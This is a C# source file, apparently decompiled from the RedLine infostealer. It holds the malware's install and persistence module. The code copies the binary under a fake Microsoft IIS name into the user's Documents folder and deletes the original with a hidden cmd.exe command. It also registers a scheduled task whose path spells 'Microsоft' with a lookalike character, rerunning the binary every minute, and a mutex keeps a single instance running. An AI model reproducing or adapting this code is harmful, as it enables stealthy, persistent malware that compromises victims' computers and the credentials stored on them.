using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;

namespace RedLine.Logic.Others
{
	public static class InstallManager
	{
		private static Mutex appMutex;

		public const string TaskSchedulerName = "MicrosoftIIS_CheckInstalledUpdater";

		public const string InstallFileName = "MicrosoftIISAdministration_v2.exe";

		public static string InstallDirectory = Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Documents\\IISExpress\\Config");

		public static string InstallPath => Path.Combine(InstallDirectory, "MicrosoftIISAdministration_v2.exe");

		public static string CurrentExeFile => Assembly.GetExecutingAssembly().Location;

		public static bool IsSecondCopy
		{
			get;
			private set;
		}

		public static bool IsRunningFromInstallPath => string.Equals(InstallPath, CurrentExeFile, StringComparison.OrdinalIgnoreCase);

		public static void RemoveCurrent()
		{
			Process.Start(new ProcessStartInfo
			{
				Arguments = $"/C taskkill /F /PID {Process.GetCurrentProcess().Id} && choice /C Y /N /D Y /T 3 & Del \"{CurrentExeFile}\"",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe",
				RedirectStandardOutput = true,
				UseShellExecute = false
			}).WaitForExit();
		}

		public static void KillInstalled()
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (string.Equals(process.ProcessName, "MicrosoftIISAdministration_v2.exe".Split('.')[0], StringComparison.OrdinalIgnoreCase) && string.Equals(process.MainModule.FileName, InstallPath, StringComparison.OrdinalIgnoreCase))
					{
						process.Kill();
						process.WaitForExit();
					}
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
				}
			}
		}

		public static void AddTaskScheduler()
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				while (true)
				{
					try
					{
						string arguments = "/create /tn \\Microsоft\\MicrosoftIIS_CheckInstalledUpdater" + Math.Abs((Environment.MachineName + Environment.UserName + Environment.OSVersion).GetHashCode()) + " /tr \"" + CurrentExeFile + "\" /st " + DateTime.Now.AddMinutes(1.0).ToString("HH:mm") + " /du 9999:59 /sc daily /ri 1 /f";
						Process.Start(new ProcessStartInfo
						{
							Arguments = arguments,
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true,
							RedirectStandardOutput = true,
							UseShellExecute = false,
							FileName = "schtasks.exe"
						}).WaitForExit();
					}
					catch (Exception value)
					{
						Console.WriteLine(value);
					}
					Thread.Sleep(50000);
				}
			});
			thread.IsBackground = true;
			thread.Start();
		}

		public static void Install()
		{
			if (!IsRunningFromInstallPath)
			{
				if (!Directory.Exists(InstallDirectory))
				{
					Directory.CreateDirectory(InstallDirectory);
				}
				KillInstalled();
				File.Copy(CurrentExeFile, InstallPath, overwrite: true);
				Process process = Process.Start(new ProcessStartInfo
				{
					FileName = "MicrosoftIISAdministration_v2.exe",
					WorkingDirectory = InstallDirectory
				});
				while (process.Handle == IntPtr.Zero)
				{
					Thread.Sleep(100);
				}
				RemoveCurrent();
			}
			else
			{
				appMutex = new Mutex(initiallyOwned: true, Math.Abs((Environment.MachineName + Environment.UserName + Environment.OSVersion).GetHashCode()).ToString(), out bool createdNew);
				IsSecondCopy = !createdNew;
				if (IsSecondCopy)
				{
					Environment.Exit(0);
				}
				AddTaskScheduler();
			}
		}
	}
}
